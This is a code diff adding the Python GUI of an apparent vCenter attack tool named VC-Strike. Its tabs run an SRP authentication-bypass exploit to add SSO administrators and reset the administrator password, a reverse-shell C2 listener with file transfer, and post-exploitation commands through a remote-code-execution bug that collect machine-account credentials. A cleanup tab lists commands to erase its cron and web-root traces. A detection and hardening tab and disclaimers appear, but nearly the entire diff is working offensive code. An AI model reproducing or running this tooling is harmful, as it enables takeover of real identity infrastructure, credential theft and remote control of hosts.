+        ttk.Label(af, text="密码").grid(row=0, column=2, padx=4)
+        self.v590_newpass = tk.StringVar(value=rand_name(12))
+        ttk.Entry(af, textvariable=self.v590_newpass, width=16).grid(row=0, column=3)
+        ttk.Button(af, text="↻", width=3, command=self._b309_randacct).grid(row=0, column=4)
+        ttk.Button(af, text="创建 SSO 管理员（ldapadd + 加入 Administrators）",
+                   style="Danger.TButton",
+                   command=self._b309_addadmin).grid(row=1, column=0, columnspan=5,
+                                                     sticky="w", padx=4, pady=4)
+        ttk.Label(af, text="重置密码: 账户 DN").grid(row=2, column=0, padx=4)
+        self.v590_rstuser = tk.StringVar(
+            value="cn=administrator,cn=Users,dc=vsphere,dc=local")
+        ttk.Entry(af, textvariable=self.v590_rstuser).grid(row=2, column=1, columnspan=2,
+                                                           sticky="ew", padx=2)
+        ttk.Label(af, text="新密码").grid(row=2, column=3)
+        self.v590_rstpass = tk.StringVar(value=rand_name(12))
+        ttk.Entry(af, textvariable=self.v590_rstpass, width=16).grid(row=2, column=4)
+        ttk.Button(af, text="重置该账户密码（ldapmodify replace userPassword）",
+                   style="Danger.TButton", command=self._b309_resetpw).grid(
+            row=3, column=0, columnspan=5, sticky="w", padx=4, pady=4)
+
+        cf = ttk.LabelFrame(right, text="LDAP 查询控制台")
+        cf.pack(fill="both", expand=True, pady=4)
+        ttk.Label(cf, text="Base:").grid(row=0, column=0, padx=4, sticky="w")
+        self.v590_cbase = tk.StringVar()
+        ttk.Entry(cf, textvariable=self.v590_cbase).grid(row=0, column=1, columnspan=3,
+                                                         sticky="ew")
+        ttk.Label(cf, text="范围:").grid(row=1, column=0, padx=4, sticky="w")
+        self.v590_cscope = tk.StringVar(value="sub")
+        ttk.Combobox(cf, textvariable=self.v590_cscope, values=["base", "one", "sub"],
+                     width=5, state="readonly").grid(row=1, column=1, sticky="w")
+        ttk.Label(cf, text="过滤器:").grid(row=2, column=0, padx=4, sticky="w")
+        self.v590_cfilter = tk.StringVar(value="(objectClass=*)")
+        ttk.Entry(cf, textvariable=self.v590_cfilter).grid(row=2, column=1, columnspan=3,
+                                                           sticky="ew")
+        ttk.Button(cf, text="查询", style="Acc.TButton",
+                   command=self._b309_console).grid(row=3, column=0, sticky="w",
+                                                    padx=4, pady=4)
+        self.v590_ctext = tk.Text(cf, height=10, bg=COLORS["term"], fg=COLORS["fg"],
+                                  relief="flat", font=("Consolas", 9))
+        self.v590_ctext.grid(row=4, column=0, columnspan=4, sticky="nsew", padx=4, pady=2)
+        cf.columnconfigure(1, weight=1)
+        cf.rowconfigure(4, weight=1)
+
+        nf = ttk.LabelFrame(right, text="说明")
+        nf.pack(fill="x", pady=4)
+        ttk.Label(nf, text="原理：libsrp 未校验 A ≡ 0 (mod N)。发送 A=N ⇒ S=0 ⇒ "
+                           "K=SHA1(\"\") 已知，伪造 M1 通过 SASL bind，以任意“存在”"
+                           "的身份读写 SSO 目录。\n若返回 “Illegal value for 'A' "
+                           "(A mod N == 0)” ⇒ 目标已修复。",
+                  style="Muted.TLabel").pack(anchor="w", padx=6)
+
+    def _b309_randacct(self):
+        self.v590_newuser.set("pentest_" + rand_name(4))
+        self.v590_newpass.set(rand_name(12))
+
+    def _309_net(self):
+        host = self.v590_host.get().strip().split(":")[0]
+        port = int(self.v590_port.get())
+        return host, port, self.v590_tls.get() or port == 636
+
+    def _b309_probe(self):
+        host, port, tls = self._309_net()
+        if not host:
+            messagebox.showwarning("提示", "需要目标")
+            return
+
+        def work():
+            self.log("[*] rootDSE 探测 %s:%d …" % (host, port), "i")
+            dse = root_dse_probe(host, port, tls, 8)
+            self.log("[+] SASL 机制: %s" % (",".join(dse["mechs"]) or "(无)"), "+")
+            self.log("[+] namingContexts: %s" % (";".join(dse["nc"]) or "(无)"), "+")
+            if dse["nc"] and not self.v590_cbase.get():
+                self.v590_cbase.set(dse["nc"][0])
+            if "SRP" in dse["mechs"]:
+                self.log("[+] 通告 SRP 机制 → CVE-2026-59309 攻击面暴露", "+")
+            else:
+                self.log("[!] 未通告 SRP 机制（可能已修复/禁用，或需认证读 rootDSE）", "!")
+        self.run_bg(work, "SRP探测")
+
+    def _b309_bypass(self):
+        host, port, tls = self._309_net()
+        if not host:
+            messagebox.showwarning("提示", "需要目标")
+            return
+        ident = self.v590_ident.get().strip()
+        policy = self.v590_policy.get()
+
+        def work():
+            self.log("[*] CVE-2026-59309 认证绕过 → %s:%d 身份=%s 策略=%s" %
+                     (host, port, ident, policy), "i")
+            try:
+                conn = connect_ldap(host, port, tls, 8)
+            except Exception as e:
+                self.log("[!] 连接失败: %r" % e, "!")
+                return
+            r = srp_bypass_bind(conn, ident, policy, log=self.log)
+            if not r.ok:
+                self.log("[!] %s" % r.msg, "!")
+                conn.close()
+                return
+            self.log("[+] %s" % r.msg, "+")
+            info = r.info
+            self.v590_info.delete("1.0", "end")
+            self.v590_info.insert("1.0",
+                                  "身份: %s\nN: %d bit\n服务端选项: %s\n"
+                                  "客户端选项: %s\n安全层: %s" %
+                                  (info["identity"], info["N_bits"],
+                                   info["server_options"], info["client_options"],
+                                   info["layer"]))
+            try:
+                conn.send_op(op_search("", scope=0, attrs=["namingContexts"]))
+                entries, _ = collect_search(conn)
+                ncs = []
+                for _dn, at in entries:
+                    ncs += at.get("namingContexts", [])
+                self.log("[+] 以 %s 身份读取 namingContexts: %s" % (ident, ";".join(ncs)), "+")
+                if ncs and not self.v590_cbase.get():
+                    self.v590_cbase.set(ncs[0])
+            except Exception as e:
+                self.log("[!] 后续查询失败: %r" % e, "!")
+            self.srp_conns[host] = conn
+            self.record("59309-认证绕过", host, ident,
+                        "（认证类动作无需远端清理；创建的账户见单独记录）")
+        self.run_bg(work, "认证绕过")
+
+    def _309_conn(self):
+        host = self.v590_host.get().strip().split(":")[0]
+        conn = self.srp_conns.get(host)
+        if conn is None:
+            raise RuntimeError("请先在该目标上执行认证绕过")
+        return conn, host
+
+    def _309_fill_tree(self, entries):
+        self.v590_tree.delete(*self.v590_tree.get_children())
+        for dn, at in entries:
+            keys = ("cn", "sAMAccountName", "userPrincipalName", "member", "objectClass")
+            s = " | ".join("%s=%s" % (k, ",".join(at[k][:3])) for k in keys if at.get(k))
+            self.v590_tree.insert("", "end", text=dn, values=(s[:220],))
+
+    def _b309_users(self):
+        def work():
+            conn, _host = self._309_conn()
+            base = self.v590_cbase.get().strip()
+            if not base:
+                raise RuntimeError("Base DN 为空（先执行绕过或探测）")
+            conn.send_op(op_search("cn=Users," + base, scope=2,
+                                   ffilter="(objectClass=person)",
+                                   attrs=["cn", "sAMAccountName", "userPrincipalName"]))
+            entries, code = collect_search(conn)
+            self.log("[+] 枚举到 %d 个用户对象 (code=%s)" % (len(entries), code), "+")
+            self._309_fill_tree(entries)
+        self.run_bg(work, "枚举用户")
+
+    def _b309_admins(self):
+        def work():
+            conn, _host = self._309_conn()
+            base = self.v590_cbase.get().strip()
+            if not base:
+                raise RuntimeError("Base DN 为空")
+            conn.send_op(op_search("cn=Administrators,cn=Builtin," + base, scope=0,
+                                   ffilter="(objectClass=*)",
+                                   attrs=["member", "cn", "description"]))
+            entries, _c = collect_search(conn)
+            n = 0
+            for _dn, at in entries:
+                for m in at.get("member", []):
+                    self.log("[admin] %s" % m, "+")
+                    n += 1
+            self._309_fill_tree(entries)
+            self.log("[+] 管理员组读取完成（%d 成员）" % n, "+")
+        self.run_bg(work, "管理员组")
+
+    def _b309_addadmin(self):
+        import re as _re
+
+        def work():
+            conn, host = self._309_conn()
+            base = self.v590_cbase.get().strip()
+            if not base:
+                raise RuntimeError("Base DN 为空")
+            user = self.v590_newuser.get().strip()
+            pw = self.v590_newpass.get()
+            if not _re.fullmatch(r"[A-Za-z0-9_.-]{3,32}", user):
+                raise ValueError("用户名仅允许字母数字._-，3-32 位")
+            dom = base.replace("dc=", "").replace(",", ".").replace(" ", "")
+            udn = "cn=%s,cn=Users,%s" % (user, base)
+            upn = "%s@%s" % (user, dom)
+            conn.send_op(op_add(udn, [
+                ("objectClass", ["top", "person", "organizationalPerson", "user"]),
+                ("cn", [user]), ("sn", [dom]), ("givenName", [user]),
+                ("sAMAccountName", [user]), ("userPrincipalName", [upn]),
+                ("uid", [user]), ("userPassword", [pw]),
+            ]))
+            _i, _t, val = conn.recv_op()
+            code, diag = parse_ldap_result(val)
+            if code != 0:
+                self.log("[!] 创建用户失败 code=%s %s" %
+                         (code, diag.decode("utf-8", "replace")), "!")
+                return
+            self.log("[+] 用户已创建: %s（UPN %s）" % (udn, upn), "+")
+            conn.send_op(op_modify("cn=Administrators,cn=Builtin," + base,
+                                   [(0, "member", [udn])]))
+            _i, _t, val = conn.recv_op()
+            code, diag = parse_ldap_result(val)
+            if code != 0:
+                self.log("[!] 加入管理员组失败 code=%s %s" %
+                         (code, diag.decode("utf-8", "replace")), "!")
+            else:
+                self.log("[+] %s 已加入 SSO Administrators" % user, "+")
+                self.log("[i] 登录: https://%s/ui  用户 %s / %s" % (host, upn, pw), "+")
+            self.record("59309-创建管理员", host, udn, "（清理）ldapdelete：%s" % udn)
+            self.creds["SSO新增账户@%s" % host] = "%s / %s" % (upn, pw)
+        self.run_bg(work, "创建管理员")
+
+    def _b309_resetpw(self):
+        def work():
+            conn, host = self._309_conn()
+            dn = self.v590_rstuser.get().strip()
+            pw = self.v590_rstpass.get()
+            conn.send_op(op_modify(dn, [(2, "userPassword", [pw])]))
+            _i, _t, val = conn.recv_op()
+            code, diag = parse_ldap_result(val)
+            if code == 0:
+                self.log("[+] 密码已重置: %s" % dn, "+")
+                self.creds["SSO重置@%s:%s" % (host, dn)] = pw
+                self.record("59309-重置密码", host, dn, "（请自行恢复原密码）")
+            else:
+                self.log("[!] 重置失败 code=%s %s" %
+                         (code, diag.decode("utf-8", "replace")), "!")
+        self.run_bg(work, "重置密码")
+
+    def _b309_console(self):
+        def work():
+            conn, _host = self._309_conn()
+            base = self.v590_cbase.get().strip()
+            scope = {"base": 0, "one": 1, "sub": 2}[self.v590_cscope.get()]
+            filt = self.v590_cfilter.get().strip() or "(objectClass=*)"
+            conn.send_op(op_search(base, scope=scope, ffilter=filt, attrs=["*"]))
+            entries, code = collect_search(conn)
+            lines = []
+            for dn, at in entries[:400]:
+                lines.append("DN: " + dn)
+                for k in sorted(at):
+                    lines.append("  %s: %s" % (k, "; ".join(at[k][:5])))
+            self.v590_ctext.delete("1.0", "end")
+            self.v590_ctext.insert("1.0", "\n".join(lines) or "(空结果)")
+            self.log("[+] 查询完成: %d 条 (code=%s)" % (len(entries), code), "+")
+        self.run_bg(work, "LDAP查询")
+
+    # ================= Tab4 C2 / 反弹 Shell =================
+    def _build_tab_shell(self):
+        f = self.tab_shell
+        f.columnconfigure(0, weight=3)
+        f.columnconfigure(1, weight=2)
+        f.rowconfigure(1, weight=1)
+
+        left = ttk.Frame(f)
+        left.grid(row=0, rowspan=2, column=0, sticky="nsew", padx=(0, 6))
+        right = ttk.Frame(f)
+        right.grid(row=0, rowspan=2, column=1, sticky="nsew")
+
+        lf = ttk.LabelFrame(left, text="监听与会话（多会话 C2）")
+        lf.pack(fill="x", pady=4)
+        lbar = ttk.Frame(lf)
+        lbar.pack(fill="x", padx=4, pady=2)
+        ttk.Label(lbar, text="端口:").pack(side="left")
+        self.shell_port = tk.StringVar(value="4444")
+        ttk.Entry(lbar, textvariable=self.shell_port, width=8).pack(side="left", padx=4)
+        ttk.Button(lbar, text="启动监听", style="Acc.TButton",
+                   command=self._c2_add_listener_ui).pack(side="left")
+        ttk.Button(lbar, text="探测存活", command=self._c2_probe).pack(side="left", padx=6)
+        ttk.Button(lbar, text="关闭选中会话", style="Danger.TButton",
+                   command=self._c2_close).pack(side="left")
+        ttk.Label(lf, text="植入端：② 页“植入 + 去监听”，或 CLI revshell。"
+                           "断线不自动重连；重连 = 重新植入（本工具不做隐蔽持久化）。",
+                  style="Muted.TLabel").pack(anchor="w", padx=6, pady=2)
+        wrapf = ttk.Frame(lf)
+        wrapf.pack(fill="both", expand=True, padx=4, pady=2)
+        self.sess_tree = ttk.Treeview(wrapf, columns=("addr", "created", "state"),
+                                      show="tree headings")
+        self.sess_tree.heading("#0", text="ID")
+        self.sess_tree.heading("addr", text="来源")
+        self.sess_tree.heading("created", text="创建")
+        self.sess_tree.heading("state", text="状态")
+        self.sess_tree.column("#0", width=50)
+        self.sess_tree.column("addr", width=170)
+        self.sess_tree.column("created", width=80)
+        self.sess_tree.column("state", width=70)
+        sb = ttk.Scrollbar(wrapf, command=self.sess_tree.yview)
+        self.sess_tree.pack(side="left", fill="both", expand=True)
+        sb.pack(side="left", fill="y")
+        self.sess_tree.configure(yscrollcommand=sb.set)
+        self.sess_tree.bind("<Double-1>", lambda e: self._c2_use())
+
+        rf = ttk.LabelFrame(right, text="交互终端（选中会话后直通）")
+        rf.pack(fill="both", expand=True, pady=4)
+        self.term = tk.Text(rf, bg=COLORS["term"], fg=COLORS["termfg"],
+                            insertbackground=COLORS["termfg"], relief="flat",
+                            font=("Consolas", 10))
+        self.term.pack(fill="both", expand=True, padx=4, pady=4)
+        cmdbar = ttk.Frame(rf)
+        cmdbar.pack(fill="x", padx=4, pady=4)
+        ttk.Label(cmdbar, text="shell>", style="Muted.TLabel").pack(side="left")
+        self.shell_cmd = tk.StringVar()
+        e = ttk.Entry(cmdbar, textvariable=self.shell_cmd)
+        e.pack(side="left", fill="x", expand=True, padx=6)
+        e.bind("<Return>", lambda _e: self._shell_send())
+        ttk.Button(cmdbar, text="发送", command=self._shell_send).pack(side="left")
+
+        ff = ttk.LabelFrame(right, text="文件传输（经当前会话）")
+        ff.pack(fill="x", pady=4)
+        fbar = ttk.Frame(ff)
+        fbar.pack(fill="x", padx=4, pady=2)
+        ttk.Label(fbar, text="本地:").pack(side="left")
+        self.up_local = tk.StringVar()
+        ttk.Entry(fbar, textvariable=self.up_local, width=22).pack(side="left", padx=2)
+        ttk.Label(fbar, text="远端:").pack(side="left")
+        self.up_remote = tk.StringVar(value="/tmp/uploaded")
+        ttk.Entry(fbar, textvariable=self.up_remote, width=18).pack(side="left", padx=2)
+        ttk.Button(fbar, text="上传", command=self._c2_upload).pack(side="left")
+        ttk.Button(fbar, text="下载(左右互换路径)", command=self._c2_download).pack(
+            side="left", padx=6)
+
+    def _c2_add_listener_ui(self):
+        try:
+            port = int(self.shell_port.get() or 4444)
+        except ValueError:
+            messagebox.showwarning("提示", "端口无效")
+            return
+        self._c2_add_listener(port)
+
+    def _c2_add_listener(self, port):
+        def work():
+            try:
+                self.c2m.add_listener(port)
+            except OSError as e:
+                self.log("[!] 无法监听 %d: %s" % (port, e), "!")
+        self.run_bg(work, "监听")
+
+    def _on_new_session(self, sess):
+        self.root.after(0, lambda: self.log(
+            "[+] 新会话 #%d ← %s（双击会话行开始交互）" % (sess.id, sess.addr), "+"))
+
+    def _poll_sessions(self):
+        try:
+            have = {int(i) for i in self.sess_tree.get_children()}
+            now = {}
+            for s in self.c2m.list_sessions():
+                now[s.id] = s
+                if s.id in have:
+                    continue
+                self.sess_tree.insert("", "end", iid=str(s.id), text="#%d" % s.id,
+                                      values=(s.addr, s.created,
+                                              "存活" if s.alive else "已断开"))
+            for i in have - set(now):
+                self.sess_tree.delete(str(i))
+            for i, s in now.items():
+                if self.sess_tree.exists(str(i)):
+                    self.sess_tree.item(str(i), values=(
+                        s.addr, s.created, "存活" if s.alive else "已断开"))
+        except Exception:
+            pass
+        self.root.after(1000, self._poll_sessions)
+
+    def _c2_selected(self):
+        sel = self.sess_tree.selection()
+        if not sel:
+            return None
+        return self.c2m.get(int(sel[0]))
+
+    def _c2_use(self):
+        s = self._c2_selected()
+        if s:
+            self.cur_sess = s
+            self.term.configure(state="normal")
+            self.term.insert("end", "\n== 会话 #%d (%s) ==\n" % (s.id, s.addr))
+            self.term.see("end")
+            self.term.configure(state="normal")
+            self.log("[i] 当前交互会话 → #%d" % s.id, "m")
+
+    def _c2_probe(self):
+        s = self._c2_selected()
+        if not s:
+            messagebox.showinfo("提示", "先选中会话")
+            return
+
+        def work():
+            ok = s.probe()
+            self.log("[+] 会话 #%d %s" % (s.id, "存活" if ok else "已断开"),
+                     "+" if ok else "!")
+        self.run_bg(work, "探测")
+
+    def _c2_close(self):
+        s = self._c2_selected()
+        if not s:
+            return
+        self.c2m.close(s.id)
+        if self.cur_sess and self.cur_sess.id == s.id:
+            self.cur_sess = None
+
+    def _shell_send(self):
+        cmd = self.shell_cmd.get()
+        self.shell_cmd.set("")
+        s = self.cur_sess or self._c2_selected()
+        if not s:
+            self.log("[!] 无会话（先监听并等回连，双击会话行）", "!")
+            return
+        self.term.configure(state="normal")
+        self.term.insert("end", "\n#%d> %s\n" % (s.id, cmd))
+        self.term.see("end")
+
+        def work():
+            out = s.read_until_quiet(maxwait=15)
+            self.root.after(0, lambda: self._term_append(out))
+            if not s.alive:
+                self.root.after(0, lambda: self._term_append("[!] 会话已断开\n"))
+        threading.Thread(target=work, daemon=True).start()
+
+    def _term_append(self, text):
+        self.term.configure(state="normal")
+        self.term.insert("end", text if text.endswith("\n") else text + "\n")
+        self.term.see("end")
+
+    def _c2_upload(self):
+        s = self.cur_sess or self._c2_selected()
+        local, remote = self.up_local.get().strip(), self.up_remote.get().strip()
+        if not (s and local and remote):
+            messagebox.showwarning("提示", "需要会话与两侧路径")
+            return
+
+        def work():
+            self.log("[*] 上传 %s → %s（会话 #%d）" % (local, remote, s.id), "i")
+
+            def prog(i, t):
+                self.log("  [上传 %d/%d]" % (i, t), "m")
+            out = self.c2m.upload(s.id, local, remote, progress=prog)
+            self.log("[+] %s" % out, "+")
+        self.run_bg(work, "上传")
+
+    def _c2_download(self):
+        s = self.cur_sess or self._c2_selected()
+        local, remote = self.up_local.get().strip(), self.up_remote.get().strip()
+        if not (s and local and remote):
+            messagebox.showwarning("提示", "需要会话与两侧路径")
+            return
+
+        def work():
+            try:
+                msg = self.c2m.download(s.id, remote, local)
+                self.log("[+] %s" % msg, "+")
+            except Exception as e:
+                self.log("[!] 下载失败: %s" % e, "!")
+        self.run_bg(work, "下载")
+
+    # ================= Tab5 后渗透 =================
+    def _build_tab_postex(self):
+        f = self.tab_postex
+        f.columnconfigure(0, weight=1)
+        f.rowconfigure(2, weight=1)
+        _bar, tv = self._target_bar(f)
+        self.vpx_host = tv
+
+        bf = ttk.LabelFrame(f, text="经 CVE-2026-59310 RCE（VAMI 回显）执行")
+        bf.grid(row=1, column=0, sticky="ew", pady=4)
+        for i, (key, (name, _cmd)) in enumerate(sorted(POSTEX_ACTIONS.items())):
+            ttk.Button(bf, text=name, width=22,
+                       command=lambda k=key: self._postex(k)).grid(
+                row=i // 4, column=i % 4, padx=4, pady=2)
+
+        cf = ttk.LabelFrame(f, text="自定义命令（单行，输出经 VAMI 回显取回）")
+        cf.grid(row=2, column=0, sticky="ew", pady=4)
+        self.postex_cmd = tk.StringVar()
+        ttk.Entry(cf, textvariable=self.postex_cmd).pack(side="left", fill="x",
+                                                         expand=True, padx=4)
+        ttk.Button(cf, text="执行", style="Acc.TButton",
+                   command=lambda: self._postex("cmd")).pack(side="left")
+
+        of = ttk.LabelFrame(f, text="输出 / 已收集凭据")
+        of.grid(row=3, column=0, sticky="nsew", pady=4)
+        self.postex_out = tk.Text(of, bg=COLORS["term"], fg=COLORS["termfg"],
+                                  relief="flat", font=("Consolas", 9))
+        self.postex_out.pack(fill="both", expand=True, padx=4, pady=4)
+        ttk.Label(of, text="机器账户可用于直连 LDAPS 做任意 LDAP 操作，或作为横向凭据。"
+                           "（安全边界：不含 ESXi 破坏/勒索与隐蔽持久化功能）",
+                  style="Muted.TLabel").pack(anchor="w", padx=6)
+
+    def _postex(self, key):
+        host = self.vpx_host.get().strip().split(":")[0]
+        if not host:
+            messagebox.showwarning("提示", "需要目标")
+            return
+        if key == "cmd":
+            cmd = self.postex_cmd.get()
+            if not cmd or "\n" in cmd:
+                messagebox.showwarning("提示", "需要单行命令")
+                return
+            name = "自定义"
+        else:
+            name, cmd = POSTEX_ACTIONS[key]
+        tag = rand_name(6)
+        vport = int(self.v510_vport.get() or 5480)
+        proxy = self.http_proxy.get().strip() or None
+
+        def work():
+            self.log("[*] 后渗透[%s] → %s : %s" % (name, host, cmd), "i")
+            ok, text = rce_readback(host, int(self.v510_port.get() or 514), cmd, tag,
+                                    tcp=self.v510_proto.get() in ("TCP", "TLS"),
+                                    tls=self.v510_proto.get() == "TLS",
+                                    vami_port=vport, proxy=proxy,
+                                    poll_cb=lambda s: self.log(s, "m"),
+                                    stop_flag=self.stop_flag)
+            if not ok:
+                self.log("[!] %s" % text, "!")
+                return
+            self.log("[+] %s 输出已取回" % name, "+")
+            self.postex_out.delete("1.0", "end")
+            self.postex_out.insert("1.0", text)
+            if key == "machine-creds":
+                self.creds["机器账户@%s" % host] = text.strip()[:600]
+                self.log("[+] 机器账户凭据已存入会话记录", "+")
+            if key == "sso-domain" and text.strip():
+                dom = text.strip().splitlines()[0]
+                self.log("[i] 可将 ③ 页 Base DN 更新为 dc=%s" %
+                         ",dc=".join(dom.split(".")), "m")
+            self.record("59310-后渗透", host, name,
+                        "rm -f /opt/vmware/share/htdocs/r%s.txt "
+                        "/etc/cron.d/cve59310%s*" % (tag, tag))
+        self.run_bg(work, "后渗透")
+
+    # ================= Tab6 清理中心 =================
+    def _build_tab_clean(self):
+        f = self.tab_clean
+        f.columnconfigure(0, weight=1)
+        f.rowconfigure(1, weight=1)
+        top = ttk.Frame(f)
+        top.grid(row=0, column=0, sticky="ew", pady=4)
+        ttk.Button(top, text="生成清理方案（聚合本次会话）", style="Acc.TButton",
+                   command=self._clean_gen).pack(side="left")
+        ttk.Button(top, text="复制到剪贴板",
+                   command=self._clean_copy).pack(side="left", padx=6)
+        self.clean_txt = tk.Text(f, bg=COLORS["term"], fg=COLORS["fg"],
+                                 relief="flat", font=("Consolas", 9))
+        self.clean_txt.grid(row=1, column=0, sticky="nsew", pady=4)
+
+    def _clean_gen(self):
+        lines = ["# ===== VC-Strike 清理方案（%s）=====" % time.strftime("%Y-%m-%d %H:%M:%S"),
+                 "# 在目标 vCenter 上（已获得的 root shell / 授权运维通道）执行：", ""]
+        if not self.actions:
+            lines.append("#（本次会话无登记动作）")
+        for a in self.actions:
+            lines.append("# %s [%s] %s" % (a["time"], a["type"], a["detail"]))
+            lines.append(a["cleanup"])
+        lines += ["", "# 通用兜底（59310 全部落点）：",
+                  "rm -f /etc/cron.d/cve59310*-syslog.log",
+                  "rm -f /tmp/cve59310_* /tmp/cve59310_check_* /tmp/ws*-syslog.log",
+                  "rm -f /opt/vmware/share/htdocs/r*.txt "
+                  "/opt/vmware/share/htdocs/*-syslog.log",
+                  "ls -la /etc/cron.d/ /opt/vmware/share/htdocs/   # 复核",
+                  "",
+                  "# 59309 创建的账户：按记录逐个 ldapdelete（或经本工具 ③ 删除）",
+                  "# IR 排查建议参考 ⑦ 检测与加固"]
+        self.clean_txt.delete("1.0", "end")
+        self.clean_txt.insert("1.0", "\n".join(lines))
+        self.log("[+] 清理方案已生成（%d 项动作）" % len(self.actions), "+")
+
+    def _clean_copy(self):
+        txt = self.clean_txt.get("1.0", "end").strip()
+        if not txt:
+            return
+        self.root.clipboard_clear()
+        self.root.clipboard_append(txt)
+        self.log("[+] 已复制清理命令", "+")
+
+    # ================= Tab7 检测与加固 =================
+    def _build_tab_detect(self):
+        f = self.tab_detect
+        f.columnconfigure(0, weight=1)
+        f.rowconfigure(1, weight=1)
+        top = ttk.Frame(f)
+        top.grid(row=0, column=0, sticky="ew", pady=4)
+        ttk.Button(top, text="复制全部",
+                   command=lambda: (self.root.clipboard_clear(),
+                                    self.root.clipboard_append(DETECTION_TEXT),
+                                    self.log("[+] 已复制", "+"))).pack(side="left")
+        ttk.Label(top, text="防御侧自查 / 排查 / 缓解 —— 来自公开 POC 仓库与 QTR IR 案例",
+                  style="Muted.TLabel").pack(side="left", padx=8)
+        t = tk.Text(f, bg=COLORS["term"], fg=COLORS["fg"], relief="flat",
+                    font=("Consolas", 9))
+        t.grid(row=1, column=0, sticky="nsew", pady=4)
+        t.insert("1.0", DETECTION_TEXT)
+        t.configure(state="disabled")
+
+
+def run_gui():
+    if tk is None:
+        print("未找到 tkinter（无显示环境？）。请使用 CLI：python -m vcstrike --help")
+        return 1
+    root = tk.Tk()
+    ToolApp(root)
+    root.mainloop()
+    return 0
